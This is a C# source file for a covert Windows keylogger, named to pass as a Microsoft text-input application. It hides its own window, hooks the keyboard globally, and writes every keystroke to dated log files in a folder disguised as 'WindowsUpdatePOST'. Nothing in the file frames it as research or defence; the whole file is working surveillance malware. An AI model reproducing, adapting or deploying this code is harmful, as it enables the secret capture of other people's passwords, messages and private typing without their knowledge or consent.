using ConsoleApp;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Threading;

namespace Microsoft_TextInput_Application
{
    public partial class Form1 : Form
    {
        string LoggerFolder = "C:/WindowsUpdatePOST/";
        string LoggerFile = "LogKeys-" + DateTime.Now.Day + "-" + DateTime.Now.Month + "-" + DateTime.Now.Year + ".txt";

        bool lctrlKeyPressed;
        bool altKeyPressed;
        bool shiftPressed;
        string CurrentString = "";

        long LastKeyPressedTime;
        int secondsToAutoLog = 10;
        bool isLastAutosaved = false;

        DispatcherTimer timer;


        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar= false;

            if (!Directory.Exists("C:/WindowsUpdatePost/"))
            {
                Directory.CreateDirectory(LoggerFolder);
            }

            KeyboardHook kbh = new KeyboardHook();
            kbh.OnKeyPressed += Kbh_OnKeyPressed;
            kbh.OnKeyUnpressed += Kbh_OnKeyUnpressed;
            kbh.HookKeyboard();
            LastKeyPressedTime = DateTime.Now.Ticks;
            timer = new DispatcherTimer(DispatcherPriority.Background);
            timer.Interval = new TimeSpan(0, 0, 1);
            timer.Tick += Timer_Tick;
            timer.Start();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            secondsToAutoLog++;
            if (secondsToAutoLog >= 10)
            {
                secondsToAutoLog = 0;
                if (!isLastAutosaved)
                {
                    SaveCurrentText();
                    CurrentString = "";
                    isLastAutosaved = true;
                }
            }
        }

        private void SaveCurrentText()
        {
            try
            {
                using (StreamWriter sw = new StreamWriter(LoggerFolder + LoggerFile, true))
                {
                    sw.WriteLine(CurrentString);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        } 

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void Kbh_OnKeyUnpressed(object sender, Keys e)
        {
            if (e == Keys.LControlKey)
            {
                lctrlKeyPressed = false;
            }
            else if (e == Keys.LShiftKey || e == Keys.RShiftKey)
            {
                shiftPressed = false;
            }
            else if (e == Keys.RMenu)
            {
                altKeyPressed = false;
            }
        }

        private void Kbh_OnKeyPressed(object sender, Keys e)
        {
            secondsToAutoLog = 0;
            if (e == Keys.LControlKey)
            {
                lctrlKeyPressed = true;
            }
            else if (e == Keys.LShiftKey || e == Keys.RShiftKey)
            {
                shiftPressed = true;
            }
            else if (e == Keys.RMenu)
            {
                altKeyPressed = true;
            }
            CheckKeyCombo(e);
        }

        void CheckKeyCombo(Keys key)
        {
            string Added = "";
            long CurrentKeyPress = DateTime.Now.Ticks;
            if (lctrlKeyPressed || altKeyPressed || shiftPressed)
            {
                if (altKeyPressed && key == Keys.Q)
                {
                    Added = "@";
                }
                if (shiftPressed && key == Keys.D1)
                {
                    Added = "!";
                }
                if (shiftPressed && key == Keys.D2)
                {
                    Added = "\"";
                }
                if (shiftPressed && key == Keys.D3)
                {
                    Added = "#";
                }
                if (shiftPressed && key == Keys.D4)
                {
                    Added = "$";
                }
                if (shiftPressed && key == Keys.D5)
                {
                    Added = "%";
                }
                if (shiftPressed && key == Keys.D6)
                {
                    Added = "&";
                }
                if (shiftPressed && key == Keys.D7)
                {
                    Added = "/";
                }
                if (shiftPressed && key == Keys.D8)
                {
                    Added = "(";
                }
                if (shiftPressed && key == Keys.D9)
                {
                    Added = ")";
                }
                if (shiftPressed && key == Keys.D0)
                {
                    Added = "=";
                }
                if (shiftPressed && key == Keys.Oemcomma)
                {
                    Added = ";";
                }
                if (shiftPressed && key == Keys.OemPeriod)
                {
                    Added = ":";
                }
                if (shiftPressed && key == Keys.OemMinus)
                {
                    Added = "_";
                }
                if (shiftPressed && key == Keys.Oem7)
                {
                    Added = "[";
                }
                if (shiftPressed && key == Keys.OemQuestion)
                {
                    Added = "]";
                }
                if (shiftPressed && key == Keys.Oem1)
                {
                    Added = "¨";
                }
                if (shiftPressed && key == Keys.OemOpenBrackets)
                {
                    Added = "?";
                }
                if (shiftPressed && key == Keys.Oem6)
                {
                    Added = "¡";
                }
                if (shiftPressed && key == Keys.Enter)
                {
                    Added = "\n";
                }
            }
            else
            {
                switch (key)
                {
                    case Keys.Back:
                        if (CurrentString.Length > 0)
                        {
                            CurrentString = CurrentString.Substring(0, CurrentString.Length - 1);
                        }
                        break;
                    case Keys.Tab: Added = "\t"; break;
                    case Keys.Enter: Added = "\n"; break;
                    case Keys.Space: Added = " "; break;

                    case Keys.D0: Added = "0"; break;
                    case Keys.D1: Added = "1"; break;
                    case Keys.D2: Added = "2"; break;
                    case Keys.D3: Added = "3"; break;
                    case Keys.D4: Added = "4"; break;
                    case Keys.D5: Added = "5"; break;
                    case Keys.D6: Added = "6"; break;
                    case Keys.D7: Added = "7"; break;
                    case Keys.D8: Added = "8"; break;
                    case Keys.D9: Added = "9"; break;

                    case Keys.A:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "A" : "a";
                        break;
                    case Keys.B:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "B" : "b";
                        break;
                    case Keys.C:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "C" : "c";
                        break;
                    case Keys.D:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "D" : "d";
                        break;
                    case Keys.E:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "E" : "e";
                        break;
                    case Keys.F:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "F" : "f";
                        break;
                    case Keys.G:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "G" : "g";
                        break;
                    case Keys.H:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "H" : "h";
                        break;
                    case Keys.I:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "I" : "i";
                        break;
                    case Keys.J:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "J" : "j";
                        break;
                    case Keys.K:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "K" : "k";
                        break;
                    case Keys.L:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "L" : "l";
                        break;
                    case Keys.M:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "M" : "m";
                        break;
                    case Keys.N:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "N" : "n";
                        break;
                    case Keys.Oemtilde:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "Ñ" : "ñ";
                        break;
                    case Keys.O:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "O" : "o";
                        break;
                    case Keys.P:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "P" : "p";
                        break;
                    case Keys.Q:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "Q" : "q";
                        break;
                    case Keys.R:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "R" : "r";
                        break;
                    case Keys.S:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "S" : "s";
                        break;
                    case Keys.T:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "T" : "t";
                        break;
                    case Keys.U:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "U" : "u";
                        break;
                    case Keys.V:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "V" : "v";
                        break;
                    case Keys.W:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "W" : "w";
                        break;
                    case Keys.X:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "X" : "x";
                        break;
                    case Keys.Y:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "Y" : "y";
                        break;
                    case Keys.Z:
                        Added = Control.IsKeyLocked(Keys.CapsLock) ? "Z" : "z";
                        break;

                    case Keys.NumPad0: Added = "0"; break;
                    case Keys.NumPad1: Added = "1"; break;
                    case Keys.NumPad2: Added = "2"; break;
                    case Keys.NumPad3: Added = "3"; break;
                    case Keys.NumPad4: Added = "4"; break;
                    case Keys.NumPad5: Added = "5"; break;
                    case Keys.NumPad6: Added = "6"; break;
                    case Keys.NumPad7: Added = "7"; break;
                    case Keys.NumPad8: Added = "8"; break;
                    case Keys.NumPad9: Added = "9"; break;

                    case Keys.OemPeriod:
                        Added = ".";
                        break;
                    case Keys.Oemcomma:
                        Added = ",";
                        break;
                    case Keys.OemMinus:
                        Added = "-";
                        break;
                    case Keys.Oemplus:
                        Added = "+";
                        break;
                    case Keys.Oem7:
                        Added = "{";
                        break;
                    case Keys.OemQuestion:
                        Added = "}";
                        break;
                    case Keys.Oem1:
                        Added = "´";
                        break;
                    case Keys.OemOpenBrackets:
                        Added = "'";
                        break;
                    case Keys.Oem6:
                        Added = "¿";
                        break;
                }
            }

            if (CurrentKeyPress - LastKeyPressedTime >= 30000000)
            {
                SaveCurrentText();
                isLastAutosaved= false;
                CurrentString = Added;
            }
            else
            {
                CurrentString += Added;
            }
            LastKeyPressedTime = CurrentKeyPress;
        }
    }
}
